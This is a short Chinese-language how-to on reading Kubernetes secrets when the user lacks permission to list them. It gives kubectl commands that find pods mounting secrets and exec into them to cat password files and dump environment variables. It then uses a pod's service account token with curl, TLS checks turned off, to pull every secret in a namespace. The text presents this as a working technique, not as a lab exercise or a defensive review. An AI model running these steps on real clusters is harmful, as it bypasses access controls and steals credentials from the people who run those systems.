## Overview

这篇文档主要是讲如何在用户没有查看secret的权限下查看secret的内容



step1 查看自己的权限

```
kubectl get role,rolebinding,clusterrole,clusterrolebinding -A
```

然后提示我们没有权限看到这些内容

```
kubectl auth can-i list secrets
```

然后我们发现我们有查看pod的权限



step2 

我们尝试看看我们能看到的pod里面是否有挂载或者使用这些secret

```
kubectl  get pod -n data-xx -o yaml | grep -i secret
```

Bingo~ 有两个pod都挂载了两个不同的secret

然后我就通过以下方法就可以看到secret的内容

```
kubectl -n data-xx exec pod1-xx-xx -- cat /etc/secret-volume/password
kubectl -n data-xx exec podx-xxx-xxx -- env
```

但是这个时候我们还需要知道是否在这个namespace下有其他secret

step3 

我们去检查哪个pod是有使用ServiceAccount的，因为ServiceAccount 是有权限access一些secret的

我们尝试使用kubectl exec 进入有挂载serviecAccount的pod

```
curl https://kubernetes.default/api/v1/namespaces/data-xx/secrets -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" -k
```



然后我们只需要将拿到的值decode就是我们需要的secrets拉